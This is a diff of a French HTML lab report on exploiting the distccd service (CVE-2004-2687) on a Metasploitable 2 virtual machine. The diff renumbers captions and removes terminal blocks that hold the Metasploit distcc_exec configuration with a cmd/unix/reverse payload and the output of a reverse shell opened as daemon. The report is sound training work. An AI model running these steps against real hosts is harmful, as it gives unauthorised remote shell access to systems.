@@ -34,11 +34,10 @@
   <figure class="capture" id="cap-recon">
     <img src="../images/ms2-distcc/01-recon-nmap.png" alt="Scan nmap du port 3632">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc">Résultat de <code>nmap -sV -p 3632 192.168.56.101</code> : le service
       est identifié comme <code>distccd v1 (GNU 4.2.4)</code>, ouvert et sans filtrage —
       contrairement à MS1 où une ACL <code>--allow</code> restrictive bloquait l'accès.</span>
-      <span class="fname">images/ms2-distcc/01-recon-nmap.png</span>
     </figcaption>
   </figure>
 
@@ -64,11 +63,6 @@ DistCC Daemon - Command Execution (Metasploit) | multiple/remote/9915.rb
 
   <p>Puis la CVE et le mécanisme :</p>
 
-  <pre class="terminal">$ msfconsole -q -x "info exploit/unix/misc/distcc_exec; exit"
-
-References:
-  https://nvd.nist.gov/vuln/detail/CVE-2004-2687</pre>
-
   <p>La section <code>References</code> confirme <strong>CVE-2004-2687</strong>. Ce n'est pas
   une faille de code mais une <strong>mauvaise configuration par défaut</strong> : le démon
   accepte des connexions de n'importe quel hôte et exécute les ordres de compilation reçus,
@@ -83,38 +77,24 @@ References:
   <figure class="capture" id="cap-recherche">
     <img src="../images/ms2-distcc/02-recherche-module.png" alt="searchsploit distcc puis search distcc dans msfconsole">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc"><code>searchsploit distcc</code> confirme une exécution de commande
       connue, puis <code>search distcc</code> dans <code>msfconsole</code> donne le chemin du
       module (<code>exploit/unix/misc/distcc_exec</code>).</span>
-      <span class="fname">images/ms2-distcc/02-recherche-module.png</span>
     </figcaption>
   </figure>
 
   <figure class="capture" id="cap-info-cve">
     <img src="../images/ms2-distcc/03-info-cve.png" alt="info du module, section References avec la CVE">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc">Résultat de <code>info</code> sur le module : la section
       <code>References</code> donne <strong>CVE-2004-2687</strong>.</span>
-      <span class="fname">images/ms2-distcc/03-info-cve.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">3. Démarche d'exploitation</h2>
   <p>Démarche interactive dans <code>msfconsole</code>, commande par commande :</p>
-
-  <pre class="terminal">msf6 > use exploit/unix/misc/distcc_exec
-msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.56.101
-RHOSTS => 192.168.56.101
-msf6 exploit(unix/misc/distcc_exec) > set RPORT 3632
-RPORT => 3632
-msf6 exploit(unix/misc/distcc_exec) > set LHOST 192.168.56.1
-LHOST => 192.168.56.1
-msf6 exploit(unix/misc/distcc_exec) > set LPORT 4445
-LPORT => 4445
-msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
-payload => cmd/unix/reverse</pre>
 
   <p><strong class="field">Point d'attention —</strong> <code>LHOST</code>/<code>LPORT</code>
   sont nécessaires car <code>cmd/unix/reverse</code> est un payload reverse. Ce payload
@@ -125,25 +105,15 @@ payload => cmd/unix/reverse</pre>
   <figure class="capture" id="cap-config">
     <img src="../images/ms2-distcc/04-exploit-config.png" alt="Configuration du module avant lancement">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc">Chargement du module et configuration des options (<code>RHOSTS</code>,
       <code>RPORT</code>, <code>LHOST</code>, <code>LPORT</code>, <code>payload</code>).</span>
-      <span class="fname">images/ms2-distcc/04-exploit-config.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">4. Preuve d'accès obtenu</h2>
   <p><code>run -z</code> déclenche l'attaque et ouvre la session en arrière-plan ;
   <code>sessions -c "..." -i 1</code> exécute les commandes de preuve dans la session :</p>
-
-  <pre class="terminal">msf6 exploit(unix/misc/distcc_exec) > run -z
-[*] Command shell session 1 opened (192.168.56.1:4445 -> 192.168.56.101:56190)
-msf6 exploit(unix/misc/distcc_exec) > sessions -c "id; uname -a; hostname; whoami" -i 1
-[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
-metasploitable
-daemon</pre>
 
   <p>L'accès obtenu est celui du compte de service <strong><code>daemon</code></strong>
   (uid=1), pas root : le démon distccd tourne sous ce compte, donc la commande injectée hérite
@@ -154,11 +124,10 @@ daemon</pre>
   <figure class="capture" id="cap-preuve">
     <img src="../images/ms2-distcc/05-session-daemon.png" alt="Shell daemon confirmé, uid=1">
     <figcaption>
-      <strong class="idx">5.</strong>
+      <strong class="idx">e.</strong>
       <span class="desc">Ouverture de la session et sortie de
       <code>id; uname -a; hostname; whoami</code> : accès confirmé en
       <code>uid=1(daemon)</code> sur l'hôte <code>metasploitable</code>.</span>
-      <span class="fname">images/ms2-distcc/05-session-daemon.png</span>
     </figcaption>
   </figure>
 
